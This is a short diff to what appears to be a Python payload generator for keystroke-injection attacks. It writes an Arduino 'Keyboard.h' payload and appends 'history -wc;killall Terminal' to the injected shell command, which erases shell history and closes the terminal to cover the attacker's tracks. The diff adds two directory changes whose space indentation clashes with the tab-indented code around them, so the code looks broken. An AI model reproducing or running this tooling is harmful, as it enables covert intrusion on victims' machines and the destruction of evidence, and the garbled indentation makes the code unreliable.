@@ -39,6 +39,8 @@ class payload:
 				break
 		shell_command += "history -wc;killall Terminal"
 		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		w = os.environ['OLDPWD']
+                os.chdir(w)
 		if os.path.isdir(path):
 		    if os.path.exists(path):
 			if path[:-1] == "/":
@@ -59,6 +61,8 @@ class payload:
 		    else:
 		        h.info_error("Local directory: "+direct+": does not exist!")
 		        exit
+		g = os.environ['HOME']
+                os.chdir(g + "/mouse")
 		payload = """\
 #include "Keyboard.h"
 
